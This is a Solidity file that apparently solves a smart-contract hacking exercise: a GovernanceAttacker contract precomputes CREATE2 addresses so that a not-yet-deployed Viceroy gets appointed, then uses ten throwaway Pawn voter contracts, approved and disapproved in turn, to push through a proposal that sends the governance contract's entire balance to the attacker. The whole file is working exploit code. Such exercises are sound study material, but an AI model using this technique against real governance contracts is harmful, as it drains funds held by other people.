// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Viceroy.sol";
contract GovernanceAttacker {
    uint public proposalId;
    address public viceroyAddress;
    address public deployedviceroyAddress;

    function attack(address _gouv) external payable {
        Governance gouv = Governance(_gouv);

        bytes memory bytecode = abi.encodePacked(type(Viceroy).creationCode, abi.encode(address(gouv), msg.sender));
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                keccak256("i will be appointed as Viceroy"),
                keccak256(bytecode)
            )
        );
        viceroyAddress = address(uint160(uint256(hash)));

        // Step 2: Appoint the yet-to-be-deployed contract
        gouv.appointViceroy(viceroyAddress, 1);

        // Step 3: Deploy Viceroy (now allowed)
        Viceroy v = new Viceroy{salt: keccak256("i will be appointed as Viceroy")}(address(gouv), msg.sender);
        deployedviceroyAddress = address(v);

        gouv.executeProposal(0);
    }
}

contract Viceroy {
    uint256 public proposalId;
    constructor(address _gouv, address attacker) {
        Governance gouv = Governance(_gouv);
        bytes memory proposal = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            attacker,
            "",
            address(gouv).balance
        );
        proposalId = uint256(keccak256(proposal));
        gouv.createProposal(address(this), proposal);

        // make a proposal
        for (uint i = 0; i < 10; i++) {
            bytes memory bytecode = abi.encodePacked(type(Pawn).creationCode, abi.encode(_gouv, proposalId));
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    keccak256("i will be approved by the Viceroy"),
                    keccak256(bytecode)
                )
            );
            address pawn_address = address(uint160(uint256(hash)));
            gouv.approveVoter(address(pawn_address));
            Pawn p = new Pawn{salt: keccak256("i will be approved by the Viceroy")}(_gouv, proposalId);

            p.vote();
            gouv.disapproveVoter(address(pawn_address));
        }
        gouv.executeProposal(proposalId);
    }
}

contract Pawn {
    Governance public gouv;
    uint public proposalId;
    address viceroy;

    constructor(address _gouv, uint _proposalId) {
        viceroy = msg.sender;
        gouv = Governance(_gouv);
        proposalId = _proposalId;
    }

    function vote() public {
        gouv.voteOnProposal(proposalId, true, viceroy);
    }
}
